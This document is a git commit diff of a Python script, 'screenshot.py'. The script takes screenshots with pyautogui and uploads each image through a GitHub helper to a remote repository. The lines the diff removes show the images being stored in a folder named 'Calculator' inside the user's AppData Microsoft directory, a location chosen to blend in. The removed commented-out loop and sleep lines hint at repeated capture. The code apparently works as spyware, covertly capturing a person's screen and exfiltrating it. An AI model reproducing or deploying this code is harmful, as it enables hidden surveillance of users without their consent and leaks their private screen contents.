03d92f478db029301767fc7fbf4edf4335440e96
Fleur Van Buiijten <61800948+fighttothesky@users.noreply.github.com>
2023-05-27 14:07:31 +0200

    Update screenshot.py

--- screenshot.py
+++ screenshot.py
@@ -2,30 +2,15 @@ import pyautogui
 from datetime import datetime
 import os
 from github_helper import GithubHelper
-
-
-# Directory
-directory = "Calculator"
-
-# Parent Directory path
-parent_dir = "C:\\Users\\User\\AppData\\Roaming\\Microsoft"
-
-# Path
-path = os.path.join(parent_dir, directory)
-
-if not os.path.exists(path):
-    os.mkdir(path)
+from localdata_dir import create_dir
 
 
 def take_screenshot():
     screenshot = pyautogui.screenshot()
     return screenshot
 
-
-# while True:
-
 # screenshot details
-folder_path = path
+folder_path = create_dir()
 screenshot_name = f"screenshot_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png"
 file_path = f"{folder_path}\\{screenshot_name}"
 
@@ -41,4 +26,3 @@ with open(file_path, "rb") as file:
 # Upload the file to the repository
 github_helper = GithubHelper()
 github_helper.create_file("pythontest", f"{screenshot_name}", "commit message", content)
-# time.sleep(60)
